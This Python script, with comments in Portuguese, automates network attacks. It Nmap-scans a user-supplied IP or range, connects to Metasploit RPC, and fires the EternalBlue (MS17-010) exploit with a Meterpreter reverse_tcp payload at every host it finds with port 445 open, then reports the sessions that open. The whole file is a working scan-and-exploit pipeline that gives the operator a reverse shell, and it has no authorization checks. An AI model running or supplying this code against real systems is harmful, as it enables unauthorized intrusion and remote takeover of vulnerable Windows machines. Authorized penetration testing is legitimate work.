import nmap
import time
import sys
from metasploit.msfrpc import MsfRpcClient, MsfRpcError

class VulnScannerPro:
    def __init__(self, target, msf_password, msf_host='127.0.0.1', msf_port=55553):
        """
        Inicializa o scanner com o alvo e conexão ao Metasploit RPC.
        """
        self.target = target
        self.nm = nmap.PortScanner()
        self.msf_password = msf_password
        self.msf_host = msf_host
        self.msf_port = msf_port
        self.client = None

    def connect_msf(self, max_retries=5, wait_seconds=5):
        """
        Tenta conectar ao Metasploit RPC com retries.
        """
        for attempt in range(max_retries):
            try:
                print(f"[+] Tentando conectar ao Metasploit RPC ({self.msf_host}:{self.msf_port}) - tentativa {attempt+1}")
                self.client = MsfRpcClient(self.msf_password, server=self.msf_host, port=self.msf_port, ssl=False)
                print("[+] Conectado ao Metasploit RPC com sucesso!")
                return True
            except MsfRpcError as e:
                print(f"[-] Erro ao conectar ao Metasploit RPC: {e}")
                time.sleep(wait_seconds)
        print("[-] Falha ao conectar ao Metasploit RPC após várias tentativas.")
        return False

    def scan_network(self):
        """
        Executa varredura Nmap no alvo com detecção de portas, serviços e SO.
        """
        print(f"[*] Iniciando varredura Nmap no alvo: {self.target}")
        try:
            self.nm.scan(self.target, arguments='-sS -sV -O --max-retries 2 --host-timeout 30s')
        except Exception as e:
            print(f"[-] Erro durante a varredura Nmap: {e}")
            sys.exit(1)

        hosts = self.nm.all_hosts()
        print(f"[*] Varredura concluída. Hosts encontrados: {len(hosts)}")
        return hosts

    def print_scan_results(self, hosts):
        """
        Exibe os resultados da varredura Nmap de forma detalhada.
        """
        for host in hosts:
            print(f"\nHost: {host} ({self.nm[host].hostname()})")
            print(f"Estado: {self.nm[host].state()}")
            for proto in self.nm[host].all_protocols():
                print(f"Protocolo: {proto}")
                ports = self.nm[host][proto].keys()
                for port in sorted(ports):
                    port_info = self.nm[host][proto][port]
                    print(f"Porta: {port}\tEstado: {port_info['state']}\tServiço: {port_info['name']}\tVersão: {port_info.get('version', '')}")
            osmatch = self.nm[host]['osmatch']
            if osmatch:
                print(f"Sistema Operacional: {osmatch[0]['name']}")
            else:
                print("Sistema Operacional: Desconhecido")

    def run_exploit(self, host, port, exploit_name, payload_name, lhost, lport):
        """
        Executa um exploit do Metasploit contra o host e porta especificados.
        """
        print(f"[*] Executando exploit {exploit_name} contra {host}:{port}")

        try:
            exploit = self.client.modules.use('exploit', exploit_name)
            payload = self.client.modules.use('payload', payload_name)

            # Configura parâmetros do exploit
            exploit['RHOSTS'] = host
            exploit['RPORT'] = port
            exploit['PAYLOAD'] = payload_name
            exploit['LHOST'] = lhost
            exploit['LPORT'] = lport

            # Executa o exploit
            job_id = exploit.execute(payload=payload_name)
            print(f"[+] Exploit iniciado com job ID: {job_id}")

            # Aguarda um tempo para o exploit tentar abrir sessão
            time.sleep(15)

            sessions = self.client.sessions.list
            if sessions:
                print(f"[+] Sessões abertas: {sessions}")
            else:
                print("[-] Nenhuma sessão aberta após o exploit.")
        except MsfRpcError as e:
            print(f"[-] Erro ao executar exploit: {e}")

    def run(self):
        """
        Fluxo principal: conecta ao Metasploit, faz varredura e executa exploits.
        """
        if not self.connect_msf():
            sys.exit(1)

        hosts = self.scan_network()
        self.print_scan_results(hosts)

        # Exemplo: executar exploit em portas abertas encontradas
        for host in hosts:
            for proto in self.nm[host].all_protocols():
                for port in self.nm[host][proto].keys():
                    port_info = self.nm[host][proto][port]
                    if port_info['state'] == 'open':
                        # Aqui você pode implementar lógica para escolher exploits adequados
                        # Exemplo fixo para MS17-010 (EternalBlue) em SMB (porta 445)
                        if port == 445:
                            exploit_name = 'exploit/windows/smb/ms17_010_eternalblue'
                            payload_name = 'windows/x64/meterpreter/reverse_tcp'
                            lhost = '0.0.0.0'  # Ajuste para seu IP de callback
                            lport = 4444       # Ajuste para sua porta de callback
                            self.run_exploit(host, port, exploit_name, payload_name, lhost, lport)
                            return  # Remove se quiser testar múltiplos hosts/portas

if __name__ == "__main__":
    target_ip = input("Informe o IP ou range alvo: ").strip()
    msf_pass = input("Informe a senha do Metasploit RPC: ").strip()
    scanner = VulnScannerPro(target_ip, msf_pass)
    scanner.run()